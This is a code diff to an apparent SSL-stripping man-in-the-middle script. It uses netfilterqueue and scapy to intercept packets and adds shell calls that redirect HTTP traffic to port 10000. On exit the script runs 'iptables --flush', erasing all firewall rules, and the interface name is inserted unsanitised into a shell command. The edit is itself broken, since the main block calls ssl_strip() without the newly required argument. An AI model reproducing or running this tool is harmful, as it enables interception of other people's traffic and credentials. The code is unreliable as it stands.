@@ -1,6 +1,7 @@
 import netfilterqueue
 from scapy.all import *
 import re
+import os
 
 def process_packet(packet):
     scapy_packet = IP(packet.get_payload())
@@ -29,7 +30,8 @@ def set_load(packet, load):
     del packet[TCP].chksum
     return packet
 
-def ssl_strip():
+def ssl_strip(interface):
+    os.system("iptables -t nat -A PREROUTING -i {} -p tcp --destination-port 80 -j REDIRECT --to-port 10000".format(interface))
     queue = netfilterqueue.NetfilterQueue()
     try:
         queue.bind(0, process_packet)
@@ -37,9 +39,8 @@ def ssl_strip():
     except Exception as e:
         print("Error: {}".format(e))
         queue.unbind()
-
-# iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
-# iptables --flush
+    finally:
+        os.system("iptables --flush")
 
 if __name__ == "__main__":
     ssl_strip()
